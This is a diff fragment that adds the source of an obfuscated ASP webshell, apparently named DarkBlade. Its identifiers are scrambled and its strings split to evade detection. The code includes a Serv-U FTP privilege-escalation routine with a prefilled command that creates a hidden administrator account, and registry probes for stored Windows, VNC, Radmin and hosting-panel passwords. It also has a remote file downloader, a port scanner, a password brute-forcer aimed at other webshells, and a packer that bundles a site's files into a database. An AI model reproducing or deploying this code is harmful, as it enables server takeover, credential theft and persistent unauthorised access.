+goql(Err)
+Else
+avivi"File saved."
+End If
+End Sub
+Sub uko()
+If Not lslt Then On Error Resume Next
+Server.ScriptTimeOut=5000
+If godj=""Then godj=pex
+If godj=""Then godj=qnvke
+If orl=""Then orl=rumla("DarkBlade.mdb")
+If cbr=""Then cbr="fso"
+lyau"File Packer/Unpacker"
+echo"<center>"
+ahwr"100%"
+sffh 1
+nef True
+doTd"File Pack","10%"
+vkrju"text","godj",godj,"30%","",""
+nuauc"<td style=""width:50%;"">"
+rhnww"ydoho","80px",""
+ihxbe"flfnc","FSO"
+ihxbe"pwn","UnFSO"
+zkdl
+echo" Pack as : "
+bcnd"text","orl",orl,40,""
+echo"</td>"
+vkrx"Pack","10%"
+potex
+sffh 0
+doTd"Exceptional folder",""
+vkrju"text","qotel",qotel,"30%","",""
+echo"<td colspan=""2"">"
+echo"Exceptional file type,split with | "
+bcnd"text","jkjzp",jkjzp,40,""
+echo"</td></tr>"
+ymw
+cmj
+echo"<hr>"
+ahwr"100%"
+sffh 1
+nef True
+tpdyo"ydoho","ndt"
+doTd"Release to","10%"
+vkrju"text","godj",godj,"30%","",""
+nuauc"<td> Mdb path : "
+bcnd"text","orl",orl,40,""
+echo"</td>"
+vkrx"Unpack","10%"
+cmj
+potex
+ymw
+echo"</center>"
+echo"<hr>Notice: Unpacking need FSO object,all files unpacked will be under target folder,replacing same named!"
+Select Case ydoho
+Case"flfnc"
+rsqvg"fso"
+Case"pwn"
+rsqvg"app"
+Case"ndt"
+zlm()
+End Select
+End Sub
+Sub rsqvg(cbr)
+If Not lslt Then On Error Resume Next
+Dim rs,kpc,mqq
+Set rs=zkew("Ado"&pgjme&"db.R"&ura&"ecordSet")
+Set cykbq=zkew("Ado"&pgjme&"db.S"&fmt&"tream")
+Set mqq=zkew("ADOX.Catalog")
+If InStr(orl,":\")<1 Then orl=rumla(orl)
+ejs=rqv(orl,"\")
+kpc=efpnh(orl)
+mqq.Create kpc
+qws(kpc)
+conn.Execute("Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED,strPath VarChar,binContent Image)")
+fegof Err
+cykbq.Open
+cykbq.Type=1
+rs.Open"FileData",conn,3,3
+ejs=Lcase(ejs)
+yqpew=Replace(ejs,".mdb",".ldb")
+If cbr="fso"Then
+wkfv godj,godj,rs,cykbq
+Else
+tdm godj,godj,rs,cykbq
+End If
+rs.Close
+vwrt
+cykbq.Close
+Set rs=Nothing
+Set cykbq=Nothing
+Set mqq=Nothing
+If Err Then
+goql(Err)
+Else
+avivi"Packing completed"
+End If
+End Sub
+Sub wkfv(godj,ojmou,rs,cykbq)
+If Not lslt Then On Error Resume Next
+Dim bvn,theFolder,gpq,files
+If Not(grl.FolderExists(ojmou))Then
+avivi"Folder dosen't exists or access denied!"
+vres
+End If
+qotel=Lcase(qotel)
+Set theFolder=grl.GetFolder(ojmou)
+For Each bvn In theFolder.Files
+If Not(wwwh(rqv(bvn.name,"."),"^("&jkjzp&")$") Or Lcase(bvn.Name)=ejs Or Lcase(bvn.Name)=yqpew)Then
+rs.AddNew
+rs("strPath")=Replace(bvn.Path,godj&"\","")
+execute "cykbq.L"&ysj&"oadFromFile(bvn.Path)"
+rs("binContent")=cykbq.Read()
+rs.Update
+End If
+Next
+For Each bvn In theFolder.SubFolders
+If Not wwwh(bvn.name,"^("&qotel&")$")Then
+wkfv godj,bvn.Path,rs,cykbq
+End If
+Next
+Set files=Nothing
+Set gpq=Nothing
+Set theFolder=Nothing
+End Sub
+Sub tdm(godj,ojmou,rs,cykbq)
+If Not lslt Then On Error Resume Next
+Dim bvn,theFolder,iecie
+execute "Set theFolder=njt.NameSpac"&zmmmn&"e(ojmou)"
+For Each bvn In theFolder.Items
+If Not bvn.IsFolder And Lcase(bvn.Name)<>ejs And Lcase(bvn.Name)<>yqpew And Not(wwwh(rqv(bvn.name,"."),"^("&jkjzp&")$"))  Then
+rs.AddNew
+rs("strPath")=Replace(bvn.Path,godj&"\","")
+execute "cykbq.L"&ysj&"oadFromFile(bvn.Path)"
+rs("binContent")=cykbq.Read()
+rs.Update
+End If
+Next
+For Each bvn In theFolder.Items
+If bvn.IsFolder And Not wwwh(bvn.name,"^("&qotel&")$") Then
+tdm godj,bvn.Path,rs,cykbq
+End If
+Next
+Set theFolder=Nothing
+End Sub
+Sub zlm()
+If Not lslt Then On Error Resume Next
+Server.ScriptTimeOut=5000
+Dim rs,str,theFolder
+godj=godj
+godj=Replace(godj,"\\","\")
+If InStr(orl,":\")<1 Then orl=rumla(orl)
+Set rs=zkew("Ado"&pgjme&"db.R"&ura&"ecordSet")
+Set cykbq=zkew("Ado"&pgjme&"db.S"&fmt&"tream")
+kpc=efpnh(orl)
+qws(kpc)
+rs.Open"FileData",conn,1,1
+fegof Err
+cykbq.Open
+cykbq.Type=1
+Do Until rs.Eof
+If InStr(rs("strPath"),"\")>0 Then
+theFolder=godj&"\"&saqv(rs("strPath"),"\",False)
+Else
+theFolder=godj
+End If
+If Not grl.FolderExists(theFolder)Then
+execute "grl.Crea"&tiak&"teFolder(theFolder)"
+End If
+cykbq.SetEos()
+cykbq.Write rs("binContent")
+execute "cykbq.Sa"&cmiwr&"vetoFile godj&""\""&rs(""strPath""),2"
+rs.MoveNext
+Loop
+rs.Close
+vwrt
+cykbq.Close
+Set rs=Nothing
+Set cykbq=Nothing
+If Err Then
+goql(Err)
+Else
+avivi"Unpacking completed"
+End If
+End Sub
+Sub wks()
+If Not lslt Then On Error Resume Next
+Server.ScriptTimeOut=5000
+Dim theFolder
+lyau("Text File Searcher/Replacer")
+If godj=""Then
+godj=iwhpp
+End If
+nef True
+ahwr"100%"
+sffh 1
+doTd"Keyword","20%"
+jfd"thrma",thrma,4
+echo"<td>"
+rhnww"ydoho","80px",""
+ihxbe"fsoSearch","FSO"
+ihxbe"saSearch","UnFSO"
+zkdl
+echo"<br>"
+kbae"zbxwy",1," Regexp",""
+nuauc"</td>"
+potex
+sffh 0
+doTd"Replace as",""
+jfd"kfh",kfh,4
+echo"<td>"
+kbae"eloe",1," Replace",""
+nuauc"</td>"
+potex
+sffh 1
+doTd"Path",""
+vkrju"text","godj",godj,"","",""
+echo"<td>"
+bcnd"radio","searchType","filename","",""
+echo"File name "
+bcnd"radio","searchType","nwwj","","checked"
+echo"File content"
+echo"</td>"
+potex
+sffh 0
+doTd"Search type",""
+vkrju"text","rks",wjjkt,"","",""
+vkrx"Search",""
+potex
+ymw
+If thrma<>""Then
+echo"<hr>"
+dwq
+If ydoho="fsoSearch"Then
+Set theFolder=grl.GetFolder(godj)
+Call vzznk(theFolder,thrma)
+Set theFolder=Nothing
+ElseIf ydoho="saSearch"Then
+Call jgr(godj,thrma)
+End If
+echo"</ul>"
+End If
+If Err Then
+goql(Err)
+Else
+avivi"Search completed"
+End If
+vres
+End Sub
+Sub vzznk(folder,str)
+Dim ext,title,theFile,theFolder,tid
+tid=False
+If zbxwy=1 Then tid=True
+For Each theFile In folder.Files
+ext=Lcase(rqv(theFile.Name,"."))
+If searchType="filename"Then
+If tid And wwwh(theFile.Name,str)Then
+jfgq theFile.Path,"fso"
+ElseIf InStr(1,theFile.Name,str,1) > 0 Then
+jfgq theFile.Path,"fso"
+End If
+Else
+If wwwh(ext,"^("&rks&")$")Then
+If xuqm(theFile.Path,str,"fso",tid) Then
+jfgq theFile.Path,"fso"
+End If
+End If
+End If
+Next
+For Each theFolder In folder.subFolders
+vzznk theFolder,str
+Next
+goql(Err)
+End Sub
+Function xuqm(ucsxg,s,method,tid)
+If Not lslt Then On Error Resume Next
+Dim theFile,content,find
+find=False
+If method="fso" Then
+content=izawx(ucsxg)
+Else
+content=xehxe(ucsxg)
+End If
+If Err Then
+goql(Err)
+xuqm=False
+Exit Function
+End If
+If tid Then
+find=wwwh(content,s)
+ElseIf InStr(1,content,s,1)>0 Then
+find=True
+End If
+If eloe Then
+If tid Then
+content=spa(content,s,kfh,False)
+Else
+content=Replace(content,s,kfh,1,-1,1)
+End If
+If method="fso" Then
+rwha ucsxg,content
+Else
+dlbgc ucsxg,content,2
+End If
+End If
+xuqm=find
+goql(Err)
+End Function
+Sub jgr(godj,gli)
+If Not lslt Then On Error Resume Next
+Dim title,ext,gpq,slfv,fileName,tid
+tid=False
+If zbxwy=1 Then tid=True
+execute "Set gpq=njt.Na"&kej&"meSpace(godj)"
+For Each slfv In gpq.Items
+If slfv.IsFolder Then
+Call jgr(slfv.Path,gli)
+Else
+ext=Lcase(rqv(slfv.Path,"."))
+fileName=rqv(slfv.Path,"\")
+If searchType="filename"Then
+If tid And wwwh(fileName,str)Then
+jfgq theFile.Path,"app"
+ElseIf InStr(Lcase(fileName),Lcase(str)) > 0 Then
+jfgq theFile.Path,"app"
+End If
+Else
+If wwwh(subExt,"^("&rks&")$")Then
+If xuqm(slfv.Path,gli,"app",tid) Then
+jfgq slfv.Path,"app"
+End If
+End If
+End If
+End If
+Next
+goql(Err)
+End Sub
+Sub jfgq(ucsxg,wannd)
+Dim jkin
+If wannd="fso"Then
+jkin="jmed"
+Else
+jkin="glyx"
+End If
+echo"<li><u>"&ucsxg&"</u>"
+goe jkin,"mkp",djfri(ucsxg),"Edit",""
+Response.Flush()
+End Sub
+Sub koe()
+If Not lslt Then On Error Resume Next
+Dim ipt
+ipt="darkblade"
+aokt="User "&pbff&vbCrLf
+gghq="Pass "&rlda&vbCrLf
+ayda="-DELETEDO"&twlg&"MAIN"&vbCrLf&"-IP=0.0.0.0"&vbCrLf&" PortNo="&urok&vbCrLf
+mt="SITE MAINTEN"&bwzpi&"ANCE"&vbCrLf
+otg="-SetD"&sytu&"OMAIN"&vbCrLf&"-Domain="&ipt&"|0.0.0.0|"&urok&"|-1|1|0"&vbCrLf&"-TZOEna"&yrzde&"ble=0"&vbCrLf&" TZOKey="&vbCrLf
+lpsji="-Se"&abykz&"tUSERSetUP"&vbCrLf&"-IP=0.0.0.0"&vbCrLf&"-PortNo="&urok&vbCrLf&"-User="&nuser&vbCrLf&"-Password="&npass&vbCrLf&_
+"-HomeDir="&bevuk()&"\\"&vbCrLf&"-LoginMe"&jnnbz&"sFile="&vbCrLf&"-Disable=0"&vbCrLf&"-RelPat"&olhf&"hs=1"&vbCrLf&_
+"-NeedS"&qfy&"ecure=0"&vbCrLf&"-HideHi"&zgyko&"dden=0"&vbCrLf&"-AlwaysAllowL"&ztm&"ogin=0"&vbCrLf&"-ChangePas"&bas&"sword=0"&vbCrLf&_
+"-QuotaEn"&jyuhr&"able=0"&vbCrLf&"-MaxUsersLogi"&ictj&"nPerIP=-1"&vbCrLf&"-Spee"&nov&"dLimitUp=0"&vbCrLf&"-Speed"&dtzi&"LimitDown=0"&vbCrLf&_
+"-Max"&ljp&"NrUsers=-1"&vbCrLf&"-IdleTimeO"&ondh&"ut=600"&vbCrLf&"-SessionTimeOut=-1"&vbCrLf&"-Expire=0"&vbCrLf&"-RatioUp=1"&vbCrLf&_
+"-RatioDown=1"&vbCrLf&"-RatiosCredit=0"&vbCrLf&"-QuotaCurrent=0"&vbCrLf&"-QuotaMaximum=0"&vbCrLf&_
+"-MAINTEN"&bwzpi&"ANCE=System"&vbCrLf&"-PasswordType=Regular"&vbCrLf&"-Ratios=None"&vbCrLf&" Access="&bevuk()&"\\|RW"&tiblt&"AMELCDP"&vbCrLf
+qaikf="QUIT"&vbCrLf
+lyau("Ser"&pguen&"v-U FTP Exp")
+Select Case ydoho
+Case "1"
+qket
+Case "2"
+wxval
+Case "3"
+lpcc
+Case "4"
+muxr
+Case "5"
+ymxrf
+Case Else
+If IsObject(Session("a"))Then Session("a").abort
+If IsObject(Session("b"))Then Session("b").abort
+If IsObject(Session("c"))Then Session("c").abort
+Set Session("a")=Nothing
+Set Session("b")=Nothing
+Set Session("c")=Nothing
+nef True
+tpdyo "ydoho",1
+echo"<center><b>Add Temp Domain</b><br>"
+ahwr "80%"
+sffh 1
+doTd"Local user","20%"
+vkrju"text","pbff","LocalAdmin"&nzc&"istrator","30%","",""
+doTd"Local pass","20%"
+vkrju"text","rlda","#l@$ak#.lk;0@P","30%","",""
+potex
+sffh 0
+doTd" Local port",""
+vkrju"text","uskgs","43"&jmdc&"958","","",""
+doTd"Sys drive",""
+vkrju"text","yth",bevuk(),"","",""
+potex
+sffh 1
+doTd"New user",""
+vkrju"text","nuser","go","","",""
+doTd"New pass",""
+vkrju"text","npass","od","","",""
+potex
+sffh 0
+doTd"New port",""
+vkrju"text","urok","60000","","",""
+echo"<td>"
+iajgq"Go"
+echo"</td><td>"
+bcnd"reSet","","ReSet","",""
+echo"</td></tr>"
+ymw
+echo"</center>"
+cmj
+End Select
+echo"<hr>"
+echo"<center>"
+ahwr "80%"
+sffh 1
+echo"<td>"
+goe goaction,"","","Add domain",""
+echo"</td>"
+echo"<td>"
+goe goaction,4,"","Exec cmd",""
+echo"</td>"
+echo"<td>"
+goe goaction,5,"","Clean domain",""
+echo"</td>"
+potex
+ymw
+echo"</center>"
+vres
+End Sub
+Sub qket()
+If Not lslt Then On Error Resume Next
+Set a=zkew("Microsoft.XMLH"&ldd&"TTP")
+a.open"GET","http://127.0.0.1:"&uskgs&"/goldsun/upadm"&qed&"in/s1",True,"",""
+a.send aokt&gghq&mt&ayda&otg&lpsji&qaikf
+Set Session("a")=a
+avivi"Connecting 127.0.0.1:"&uskgs&" using "&pbff&",pass:"&rlda&"..."
+muxr
+End Sub
+Sub wxval()
+If Not lslt Then On Error Resume Next
+muxr()
+Set b=zkew("Microsoft.XMLH"&ldd&"TTP")
+b.open"GET","http://"&tbsei("LOCAL_ADDR")&":"&urok&"/goldsun/upadm"&qed&"in/s2",False,"",""
+b.send"User "&nuser&vbCrLf&"pass "&npass&vbCrLf&"site exec "&ojmov&vbCrLf&qaikf
+Set Session("b")=b
+avivi"Executing comm"&zuwfd&"and..."
+nuauc"<hr><center><div class='alt1Span' style='width:80%;text-align:left'><br>"
+nuauc Replace(b.ResponseText,chr(10),"<br>")&"</div></center>"
+End Sub
+Sub lpcc()
+If Not lslt Then On Error Resume Next
+Set c=zkew("Microsoft.XMLH"&ldd&"TTP")
+c.open "GET","http://127.0.0.1:"&uskgs&"/goldsun/upadm"&qed&"in/s3",True,"",""
+c.send aokt&gghq&mt&ayda&qaikf
+Set Session("c")=c
+avivi"Temp domain deleted!"
+echo"<script language='javascript'>setTimeout(""iajgq('"&goaction&"','','')"",""3000"");</script>"
+End Sub
+Function bevuk()
+If Not lslt Then On Error Resume Next
+bevuk=Lcase(Left(grl.GetSpecialFolder(0),2))
+If bevuk=""Then bevuk="c:"
+End Function
+Sub muxr()
+If nuser=""Then nuser="go"
+If npass=""Then npass="od"
+If urok=""Then urok="60000"
+nef True
+tpdyo "ydoho",2
+echo"<center><b>Execute Cmd</b><br>"
+ahwr "80%"
+sffh 1
+doTd"comm"&zuwfd&"and",""
+vkrju"text","ojmov","cmd /c net "&ufan&"user bloodsword$ 0kee /add & net loca"&gjn&"lgroup administrators bloodsword$ /add","","",3
+potex
+sffh 0
+doTd"Ftp user",""
+vkrju"text","nuser",nuser,"","",""
+doTd"Ftp pass",""
+vkrju"text","npass",npass,"","",""
+potex
+sffh 1
+doTd"Ftp port",""
+vkrju"text","urok",urok,"","",""
+echo"<td>"
+iajgq"Go"
+echo"</td><td>"
+bcnd"reSet","","ReSet","",""
+echo"</td></tr>"
+ymw
+echo"</center>"
+cmj
+End Sub
+Sub ymxrf()
+nef True
+tpdyo "ydoho",3
+echo"<center><b>Clean Temp Domain</b><br>"
+ahwr "80%"
+sffh 1
+doTd"Local user","20%"
+vkrju"text","pbff","LocalAdmin"&nzc&"istrator","30%","",""
+doTd"Local pass","20%"
+vkrju"text","rlda","#l@$ak#.lk;0@P","30%","",""
+potex
+sffh 0
+doTd"Local port",""
+vkrju"text","uskgs","43"&jmdc&"958","","",""
+doTd"Temp domain port",""
+vkrju"text","urok","60000","","",""
+potex
+sffh 1
+echo"<td>"
+iajgq"Go"
+echo"</td><td colspan='3'>"
+bcnd"reSet","","ReSet","",""
+echo"</td></tr>"
+ymw
+echo"</center>"
+cmj
+End Sub
+Sub ijfeg()
+If Not lslt Then On Error Resume Next
+Dim theFolder
+lyau"Asp Webshell Scanner"
+echo"Path : "
+nef True
+bcnd"text","godj","/",50,""
+echo" "
+iajgq"Scan"
+kbae"ojji",1," Get include files",""
+If godj<>""Then
+If InStr(godj,":\")<1 Then godj=rumla(godj)
+echo"<hr>"
+Response.Flush()
+dwq
+Set theFolder=grl.GetFolder(godj)
+frvvv(theFolder)
+Set theFolder=Nothing
+echo"</ul>"
+End If
+vres
+End Sub
+Sub frvvv(theFolder)
+If Not lslt Then On Error Resume Next
+Server.ScriptTimeOut=5000
+Dim fvz,utia,ext,gidgk,funcs,idreq,usuct,theFile,content,jjjv
+fvz="WScri"&msn&"pt.Sh"&qvef&"ell|WScri"&msn&"pt.She"&uqc&"ll.1|She"&uqc&"ll.Appl"&dray&"ication|She"&uqc&"ll.Appl"&dray&"ication.1|clsid:72"&ghrpj&"C24DD5-D70A-438B-8A42-98424B"&jpjr&"88AFB8|clsid:137"&phhhs&"09620-C279-11CE-A49E-44455354"&oku&"0000"
+utia="WScri"&msn&"pt.Sh"&qvef&"ell;Run,Exec,RegRead|She"&uqc&"ll.Appl"&dray&"ication;ShellExec"&fze&"ute|Scripti"&kwaa&"ng.FileS"&voli&"ystemObject;CreateTextFile,OpenTextFile,SavetoFile"
+For Each jcka In theFolder.Files
+jjjv=False
+idreq=False
+ext=Lcase(rqv(jcka.Name,"."))
+If wwwh(ext,"^("&iypdn&")$") Then
+content=izawx(jcka.Path)
+usuct=""
+For Each tekgs In Split(fvz,"|")
+If InStr(1,content,tekgs,1)>0 Then
+bur jcka,"Object with risk : <font color=""red"">"&tekgs&"</font>"
+jjjv=True
+End If
+Next
+For Each strFunc In Split(utia,"|")
+gidgk=saqv(strFunc,";",True)
+funcs=rqv(strFunc,";")
+For Each subFunc In Split(funcs,",")
+If wwwh(content,"\."&subFunc&"\b") Then
+bur jcka,"Called object <font color=""red"">"&gidgk&"'s "&subFunc&"</font> Function"
+jjjv=True
+End If
+Next
+Next
+If wwwh(content,"Set\s*.*\s*=\s*server\s")Then
+bur jcka,"Found Set xxx=Server"
+jjjv=True
+End If
+If wwwh(content,"server.(execute|Transfer)([ \t]*|\()[^""]\)")Then
+bur jcka,"Found <font color=""red"">Server.E"&wdk&"xecute / Transfer()</font> Function"
+jjjv=True
+End If
+If wwwh(content,"\bLANGUAGE\s*=\s*[""]?\s*(vbscript|jscript|javascript)\.encode\b")Then
+bur jcka,"<font color=""red"">Script encrypted</font>"
+jjjv=True
+End If
+If wwwh(content,"<script\s*(.|\n)*?runat\s*=\s*""?server""?(.|\n)*?>")Then
+bur jcka,"Found <font color=""red"">"&vaiy("<script runat=""server"">")&"</font>"
+jjjv=True
+End If
+If wwwh(content,"[^\.]\bExecute\b")Then
+bur jcka,"Found <font color=""red"">Execute()</font> Function"
+jjjv=True
+End If
+If wwwh(content,"[^\.]\bExecuteGlobal\b")Then
+bur jcka,"Found <font color=""red"">Exe"&tuf&"cuteGlobal()</font> Function"
+jjjv=True
+End If
+If ojji=1 Then usuct=urnj(content,"<!--\s*#include\s+(file|virtual)\s*=\s*.*-->",False)(0)
+If usuct<>""Then
+usuct=urnj(usuct,"[/\w]+\.[\w]+",False)(0)
+If usuct=""Then 
+bur jcka,"Can't get include file"
+jjjv=True
+Else
+bur jcka,"Included file <font color=""blue"">"&usuct&"</font>"
+jjjv=True
+End If
+End If
+End If
+If jjjv Then
+echo"<hr>"
+Response.Flush()
+End If
+Next
+For Each gpq In theFolder.SubFolders
+frvvv(gpq)
+Next
+goql(Err)
+End Sub
+Sub bur(jcka,cutia)
+nuauc"<li><u>"
+goe "jmed","mkp",djfri(jcka.Path),jcka.Path,""
+nuauc"</u><font color=#9900FF>"&jcka.DateLastModIfied&"</font>-<font color=#009966>"&rwumm(jcka.size)&"</font>-"&cutia&"</li>"
+Response.Flush()
+End Sub
+Sub jiawi()
+If Not lslt Then On Error Resume Next
+If godj=""Then godj=qnvke
+Dim kheay,nyp
+nyp=svy
+kheay=lemq
+If nyp=""Then nyp=Replace("HK"&fefqk&"LM\SYSTEM\CurrentContr"&ozgne&"olSet\Control\Compu"&jzcfx&"terName\Compu"&jzcfx&"terName\Compu"&jzcfx&"terName|HK"&fefqk&"LM\SOFT"&japw&"WARE\Microsoft\Windows"&mvt&" NT\Current"&fadf&"Version\Winlo"&mukpk&"gon\AutoAdm"&tag&"inLogon|HK"&fefqk&"LM\SOFT"&japw&"WARE\Microsoft\Windows"&mvt&" NT\Current"&fadf&"Version\Winlo"&mukpk&"gon\Default"&xcyy&"UserName|HK"&fefqk&"LM\SOFT"&japw&"WARE\Microsoft\Windows"&mvt&" NT\Current"&fadf&"Version\Winlo"&mukpk&"gon\De"&sls&"faultPassword|HK"&fefqk&"LM\SYSTEM\CurrentContr"&ozgne&"olSet\Services\Ser"&pguen&"v-U-Counters\Performance\Library|HK"&fefqk&"LM\SYSTEM\CurrentContr"&ozgne&"olSet\Services\Ser"&pguen&"v-U\ImagePath|HK"&fefqk&"LM\SOFT"&japw&"WARE\Cat Soft\Ser"&pguen&"v-U\Domains\DomainList\DomainList|HK"&fefqk&"LM\SYSTEM\Radm"&dkq&"in\v2.0\Server\Parameters\Parameter|HK"&fefqk&"LM\SYSTEM\Radm"&dkq&"in\v2.0\Server\Parameters\Port|HK"&fefqk&"LM\SYSTEM\Radm"&dkq&"in\v2.0\Server\Parameters\NTAuThen"&wpx&"abled|HK"&fefqk&"LM\SYSTEM\Radm"&dkq&"in\v2.0\Server\Parameters\Fil"&gwacu&"terIp|HK"&fefqk&"LM\SYSTEM\Radm"&dkq&"in\v2.0\Server\iplist\0|HK"&fefqk&"LM\SOFT"&japw&"WARE\ORL\WinVNC3\default\Password|HK"&fefqk&"LM\SOFT"&japw&"WARE\RealVNC\WinVNC4\Password|HK"&fefqk&"LM\SOFT"&japw&"WARE\hzhost\config\Settings\mysqlpass|HK"&fefqk&"LM\SOFT"&japw&"WARE\hzhost\config\Settings\mastersvrpass|HK"&fefqk&"LM\SOFT"&japw&"WARE\hzhost\config\Settings\sysdbpss","|",Chr(13)&Chr(10))
+If kheay=""Then kheay=Replace("x:\|x:\Program Files|x:\Program Files\Ser"&pguen&"v-U|x:\Program Files\RhinoSoft.com|x:\Program Files\Radm"&dkq&"in|x:\Program Files\Mysql|x:\Program Files\mail|x:\Program Files\winwebmail|x:\Documents and Settings\All Users|x:\Documents and Settings\All Users\Documents|x:\Documents and Settings\All Users\Start Menu\Programs|x:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere|x:\Ser"&pguen&"v-U|x:\Radm"&dkq&"in|x:\Mysql|x:\mail|x:\winwebmail|x:\soft|x:\tools|x:\windows\temp","|",Chr(13)&Chr(10))
+lyau"Action Others"
+nef True
+tpdyo"ydoho","badig"
+nuauc"<b>Download to server</b><br>"
+ahwr"100%"
+sffh 1
+vkrju"text","fyd","http://","80%","",""
+vkrx"Download","20%"
+potex
+sffh 0
+vkrju"text","godj",godj,"","",""
+echo"<td>"
+kbae"overWri",2,"Overwrite",""
+potex
+ymw
+cmj
+echo"<hr>"
+nef True
+tpdyo"ydoho","rqe"
+nuauc"<b>Port scan</b><br>"
+ahwr"100%"
+sffh 1
+doTd"Scan IP","20%"
+vkrju"text","zza","127.0.0.1","60%","",""
+vkrx"Scan","20%"
+potex
+sffh 0
+doTd"Port List","20%"
+vkrju"text","fxgdn","21,23,80,1433,1521,3306,3389,4899,43"&jmdc&"958,65500","80%","",2
+potex
+ymw
+cmj
+echo"<hr>"
+nef True
+tpdyo"ydoho","fnac"
+nuauc"<b>Mini shell crack</b><br>"
+ahwr"100%"
+sffh 1
+doTd"Url","20%"
+vkrju"text","fyd","http://","60%","",""
+vkrx"Start","20%"
+potex
+sffh 0
+doTd"Dic","20%"
+vkrju"text","fjkrx","value,cmd,admin,fuck,123456,#,|,a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,~,!,@,*,$,1,2,3,4,5,6,7,8,9,0","","",""
+echo"<td>"
+rhnww"wwkh","60px",""
+ihxbe"asp","asp"
+ihxbe"php","php"
+zkdl
+echo"</td>"
+potex
+ymw
+cmj
+echo"<hr>"
+nef True
+tpdyo"ydoho","bzrd"
+nuauc"<b>Common path probe</b><br>"
+ahwr"100%"
+sffh 1
+jfd"lemq",kheay,6
+vkrx"Start","20%"
+potex
+ymw
+cmj
+echo"<hr>"
+nef True
+ahwr"100%"
+tpdyo"ydoho","cxnes"
+nuauc"<b>Registry probe</b><br>"
+ahwr"100%"
+sffh 1
+jfd"svy",nyp,6
+vkrx"Start","20%"
+potex
+ymw
+cmj
+echo"<hr>"
+Select Case ydoho
+Case"badig"
+echo"<hr>"
+gcpzw()
+Case"cxnes"
+echo"<hr>"
+vwdxd()
+Case"rqe"
+echo"<hr>"
+rxfjw()
+Case"fnac"
+echo"<hr>"
+qjt()
+Case"bzrd"
+echo"<hr>"
+dyaf()
+End Select
+End Sub
+Sub gcpzw()
+If Not lslt Then On Error Resume Next
+Dim anx,qtvcw
+Set cykbq=zkew("Ado"&pgjme&"db.S"&fmt&"tream")
+anx=rqv(fyd,"/")
+If InStr(godj,".")<1 Then godj=godj&"\"&anx
+rstb.Open"GET",fyd,False
+rstb.send
+fegof(Err)
+If overWri<>2 Then
+overWri=1
+End If
+With cykbq
+.Type=1
+.Mode=3
+.Open
+.Write rstb.ResponseBody
+.Position=0
+execute "cykbq.Saveto"&mwffs&"File godj,overWri"
+.Close
+End With
+If Err Then
+goql(Err)
+Else
+echo"Download succeeded"
+End If
+End Sub
+Sub vwdxd()
+If Not lslt Then On Error Resume Next
+Dim jzfo
+echo"Registry key detected will be shown below:<br>"
+ahwr "100%"
+xgr=1
+ceydb
+doTd"<b>Key</b>",""
+doTd"<b>Value</b>",""
+potex
+For Each ojmou In Split(svy,Chr(13)&Chr(10))
+jzfo=agppo(ojmou)
+If jzfo<>"" Then
+sffh xgr
+doTd ojmou,""
+doTd jzfo,""
+potex
+ukcm
+End If
+Next
+ymw
+End Sub
+Function agppo(rpath)
+Dim fkh,jzfo
+If Not lslt Then On Error Resume Next
+execute "fkh=qkpnf.RegRe"&vowms&"ad(rpath)"
+If IsArray(fkh)Then
+jzfo=""
+For i=0 To UBound(fkh)
+If IsNumeric(fkh(i))Then
+If CInt(fkh(i))<16 Then
+jzfo=jzfo&"0"
+End If
+jzfo=jzfo&CStr(Hex(CInt(fkh(i))))
+Else
+jzfo=jzfo&fkh(i)
+End If
+Next
+agppo=jzfo
+Else
+agppo=fkh
+End If
+End Function
+Sub rxfjw()
+If Not lslt Then On Error Resume Next
+If Not wwwh(zza,"^((\d{1,3}\.){3}(\d{1,3}),)*(\d{1,3}\.){3}(\d{1,3})$")Then
+echo "Invalid IP format"
+vres
+End If
+If Not wwwh(fxgdn,"^(\d{1,5},)*\d{1,5}$")Then
+echo "Invalid port format"
+vres
+End If
+echo "Scanning...<br>"
+Response.Flush()
+For Each tmpip In Split(zza,",")
+For Each tmpPort In Split(fxgdn,",")
+lpsj tmpip,tmpPort
+Next
+Next
+End Sub
+Sub lpsj(svp,naxg)
+On Error Resume Next
+Dim conn,kpc
+Set conn=zkew("Ado"&pgjme&"db.Conne"&kvcfz&"ction")
+kpc="Provider=SQLOLEDB.1;Data Source="&svp&","&naxg&";User ID=lake2;Password=lake2;"
+conn.ConnectionTimeout=1
+conn.open kpc
+If Err Then
+If Err.number=-2147217843 or Err.number=-2147467259 Then
+If InStr(Err.description,"(Connect()).")>0 Then
+echo"<label>"&svp&":"&naxg&"</label><label>close</label><br>"
+Else
+echo"<label>"&svp&":"&naxg&"</label><label><font color=red>open</font></label><br>"
+End If
+Response.Flush()
+End If
+End If
+End Sub
+Sub qjt()
+If Not lslt Then On Error Resume Next
+echo"Cracking...<br>"
+Response.Flush()
+For Each strPass In Split(fjkrx,",")
+If wwkh="asp"Then
+strpam=qmkc(strPass)&"="&qmkc("response.write 98611")
+Else
+strpam=qmkc(strPass)&"="&qmkc("echo 98611;")
+End If
+If InStr(ybsrh(fyd&"?"&strpam,"POST"),"98611")>0 Then
+echo"Password is <font color=red>"&strPass&"</font> ^_^"
+vres
+End If
+Next
+echo"Crack failed,RPWT?"
+goql(Err)
+End Sub
+Sub dyaf()
+If Not lslt Then On Error Resume Next
+Dim vanmc,jkury
+echo"Path detected will be shown below:<br>"
+lemq=Replace(lemq,"x:\","")
+jkury=1
+For Each drive In grl.Drives
+For Each ojmou In Split(lemq,Chr(13)&Chr(10))
+execute "vanmc=drive.DriveLet"&mwg&"ter&"":\""&ojmou"
+If grl.FolderExists(vanmc)Then
+lzwq jkury
+goe "jmed","",djfri(vanmc),vanmc,""
+echo"</span>"
+jkury=jkury+1
+If jkury=2 Then jkury=0
+sye.MoveNext
+Response.Flush()
+End If
+Next
+Next
+goql(Err)
+End Sub
+Sub gocbb()
+Response.Cookies(fxu)=""
+Response.Redirect(djdla&"?goaction="&cew)
+End Sub
+Sub lyau(ttudp)
+%>
+<html>
+<head>
+<title><%=ajwy%></title>
+<style type="text/css">
+body,td{font: 12px Arial,Tahoma;line-height: 16px;}
+.main{width:100%;padding:20px 20px 20px 20px;}
+.hidehref{font:12px Arial,Tahoma;color:#646464;}
+.showhref{font:12px Arial,Tahoma;color:#0099FF;}
+.input{font:12px Arial,Tahoma;background:#fff;height:20px;BORDER-WIDTH:1px;}
+.text{font:12px Arial,Tahoma;background:#fff;padding:1px;BORDER-WIDTH:1px;}
+.tdInput{font:12px Arial,Tahoma;background:#fff;padding:1px;height:20px;width:100%;BORDER-WIDTH:1px;}
